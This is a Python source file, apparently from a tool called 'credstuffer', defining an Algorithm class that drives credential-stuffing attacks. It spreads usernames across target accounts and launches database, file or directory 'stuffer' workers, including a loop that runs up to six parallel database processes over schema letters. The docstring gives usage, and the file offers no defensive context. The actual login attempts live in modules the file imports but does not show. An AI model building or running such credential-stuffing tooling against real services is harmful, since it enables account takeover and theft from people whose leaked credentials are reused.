import logging
from time import sleep

from credstuffer import UserAccount
from credstuffer.database_stuffer import DatabaseStuffer
from credstuffer.file_stuffer import FileStuffer
from credstuffer.directory_stuffer import DirectoryStuffer


class Algorithm:
    """ class Algorithm to execute the credential stuffing algorithm

    USAGE:
            algo = Algorithm(accounts=accounts, usernames=usernames)
            algo.file_stuffing(filepath='/tmp')
    """
    def __init__(self, accounts, usernames):
        self.logger = logging.getLogger('credstuffer')
        self.logger.info('create class Algorithm')

        self.usernames = [user.strip() for user in usernames]  # strip leading trailing whitespaces
        self.accounts = accounts

        for account in self.accounts:
            account.set_usernames(usernames=self.usernames)

        self.schema_list = list('abcdefghijklmnopqrstuvwxyz')

    def database_stuffing(self, **dbparams):
        """ creates the DatabaseStuffer instance and starts the run thread

        """
        processes = list()
        for c_schema in self.schema_list:
            stuffer = DatabaseStuffer(account=self.accounts, schema_char=c_schema, **dbparams)
            stuffer.start()
            processes.append(stuffer)
            if len(processes) == 6:
                wait = True
                while wait:
                    for proc in processes:
                        if not proc.is_alive():
                            self.logger.info("Start new Process")
                            wait = False
                    sleep(1)

    def file_stuffing(self, filepath):
        """ creates the FileStuffer instance and starts the run thread

        """
        # handle one file for credential stuffing
        stuffer = FileStuffer(account=self.accounts[0], filepath=filepath)
        stuffer.start()

    def directory_stuffing(self, dirpath):
        """ creates the DirectoryStuffer instance and starts the run thread

        """
        # handle multiple files within the given dirpath
        stuffer = DirectoryStuffer(account=self.accounts[0], directory_path=dirpath)
        stuffer.start()

